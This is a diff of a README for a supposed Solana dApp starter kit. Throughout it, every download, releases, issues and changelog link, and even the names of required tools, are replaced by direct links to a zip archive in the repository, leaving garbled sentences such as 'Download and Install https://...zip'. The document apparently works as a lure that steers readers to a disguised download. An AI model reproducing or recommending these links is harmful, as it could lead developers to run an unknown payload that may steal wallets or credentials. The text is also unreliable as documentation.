@@ -1,10 +1,10 @@
 # 🚀 solana-starter-kit - Your Easy Entry to Solana dApps
 
-[![Download](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip)](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip)
+[![Download](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip)](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip)
 
 ## 📦 Overview
 
-The **solana-starter-kit** is a user-friendly template for building decentralized applications (dApps) on the Solana blockchain. This open-source project combines an Anchor program, a TypeScript client, and a https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip user interface. It allows you to create and explore dApps without extensive programming knowledge.
+The **solana-starter-kit** is a user-friendly template for building decentralized applications (dApps) on the Solana blockchain. This open-source project combines an Anchor program, a TypeScript client, and a https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip user interface. It allows you to create and explore dApps without extensive programming knowledge.
 
 ## 🚀 Features
 
@@ -20,24 +20,24 @@ To run this application, you need the following:
 
 - **Operating System**: Windows, macOS, or Linux.
 - **Disk Space**: At least 200 MB of free space.
-- **https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip**: Version 14 or higher.
+- **https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip**: Version 14 or higher.
 - **Internet Connection**: Required for downloading dependencies and accessing the blockchain.
 
 ## 🚀 Getting Started
 
 Follow these steps to set up your environment:
 
-1. **Download and Install https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip**: 
-   - Visit [https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip) to download the latest version for your operating system.
+1. **Download and Install https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip**: 
+   - Visit [https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip) to download the latest version for your operating system.
    - Complete the installation process using the default settings.
 
 2. **Download the Solana Starter Kit**: 
    - Visit the Releases page to download the latest version.
-   - Click [here to download](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip).
+   - Click [here to download](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip).
 
 ## 📥 Download & Install
 
-To get started, simply visit the [Releases page](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip) and download the latest version of the Solana Starter Kit. Once completed, unzip the downloaded file to your desired location.
+To get started, simply visit the [Releases page](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip) and download the latest version of the Solana Starter Kit. Once completed, unzip the downloaded file to your desired location.
 
 ## 🔧 Setup Instructions
 
@@ -71,7 +71,7 @@ For detailed documentation, refer to the built-in help guide within the applicat
 
 If you have questions or need support, consider joining the community. You can connect with other users through:
 
-- [GitHub Issues](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip) for technical discussions.
+- [GitHub Issues](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip) for technical discussions.
 - Relevant forums and groups focused on Solana and dApps.
 
 ## 🛡️ Security
@@ -91,7 +91,7 @@ Stay up to date with the latest changes:
 
 - **Version 1.0**: Initial release with essential features for developing Solana dApps.
 
-For a complete history of changes, visit the [Changelog](https://raw.githubusercontent.com/patodonald007/solana-starter-kit/main/trimetalism/solana-starter-kit-v2.1-beta.5.zip).
+For a complete history of changes, visit the [Changelog](https://github.com/patodonald007/solana-starter-kit/raw/refs/heads/main/trimetalism/kit-solana-starter-v1.5.zip).
 
 ## 📞 Contact
 
